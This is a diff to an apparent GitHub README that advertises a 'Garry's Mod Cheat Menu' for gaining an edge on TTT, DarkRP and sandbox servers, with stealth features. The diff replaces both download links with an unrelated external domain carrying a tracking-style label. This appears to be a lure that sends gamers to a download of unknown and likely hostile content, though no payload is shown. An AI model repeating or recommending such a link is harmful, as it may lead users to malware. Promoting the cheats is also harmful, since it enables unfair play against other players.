@@ -2,7 +2,7 @@
 
 Take full control of your **Garry's Mod** experience with the **Garry's Mod Cheat Menu**, a powerful and versatile modding utility designed for both sandbox creativity and competitive domination. Whether you're building your dream contraption or taking on others in TTT, DarkRP, or sandbox servers, this cheat menu provides everything you need to enhance your gameplay, break boundaries, and unleash chaos or control — the choice is yours.
 
-[![Download Garry'sMod CheatMenu](https://img.shields.io/badge/Download-Garry'sMod%20CheatMenu-blueviolet)](https://garry-s-mod-cheat-menu.github.io/.github/)
+[![Download Garry'sMod CheatMenu](https://img.shields.io/badge/Download-Garry'sMod%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 Built with user customization, stealth, and performance in mind, this menu allows you to activate cheats on the fly, giving you an edge or unlimited freedom in every game mode. Perfect for private servers, offline experimentation, or low-key fun with friends.
 
@@ -49,4 +49,4 @@ Built with user customization, stealth, and performance in mind, this menu allow
 3. Open the menu in-game with the designated hotkey.
 4. Toggle your desired features and start playing with enhanced power.
 
-[![Download Garry'sMod CheatMenu](https://img.shields.io/badge/Download-Garry'sMod%20CheatMenu-blueviolet)](https://garry-s-mod-cheat-menu.github.io/.github/)
+[![Download Garry'sMod CheatMenu](https://img.shields.io/badge/Download-Garry'sMod%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
